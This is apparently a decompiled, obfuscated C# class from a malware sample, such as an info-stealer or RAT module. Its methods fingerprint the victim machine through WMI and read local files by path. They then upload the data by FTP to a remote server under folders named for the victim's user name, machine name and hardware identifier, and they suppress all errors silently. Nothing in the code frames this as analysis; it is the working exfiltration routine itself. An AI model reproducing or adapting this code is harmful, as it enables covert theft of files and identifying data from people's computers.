using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace FEPAnxLYcpgz;

internal sealed class FZYQuTJPlcz
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string bHHLhQTTINyhzg()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107446837));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107446784)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107446799);
			ManagementObject val3 = new ManagementObject(getString_0(107446794) + text + getString_0(107446721));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107446716)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107368329);
		}
	}

	public static void ZmzAAHXmpJvah(string BzeNFogcknWx = "URL", string nHNxGAAXLg = "USERNAME", string WwZKuAlOjBLuYxhr = "ACCESO", string GJfJRUopDBg = "")
	{
		try
		{
			string text = bHHLhQTTINyhzg();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(BzeNFogcknWx + getString_0(107447857) + Environment.UserName + getString_0(107447812) + Environment.MachineName + getString_0(107447823) + text + getString_0(107447818));
			ftpWebRequest.Method = getString_0(107446691);
			ftpWebRequest.Credentials = new NetworkCredential(nHNxGAAXLg, WwZKuAlOjBLuYxhr);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(GJfJRUopDBg);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void FdLmtwIxPaLAh(string RyZCbZhpcGxm = "URL", string roYVVkJJHeiaN = "USERNAME", string WBIEMHakiRNHxn = "ACCESO", string EhmVSukMyZE = "")
	{
		try
		{
			string text = bHHLhQTTINyhzg();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(RyZCbZhpcGxm + getString_0(107447857) + Environment.UserName + getString_0(107447812) + Environment.MachineName + getString_0(107447823) + text + getString_0(107447823) + Path.GetFileName(EhmVSukMyZE));
			ftpWebRequest.Method = getString_0(107446691);
			ftpWebRequest.Credentials = new NetworkCredential(roYVVkJJHeiaN, WBIEMHakiRNHxn);
			byte[] array = File.ReadAllBytes(EhmVSukMyZE);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static FZYQuTJPlcz()
	{
		Strings.CreateGetStringDelegate(typeof(FZYQuTJPlcz));
	}
}
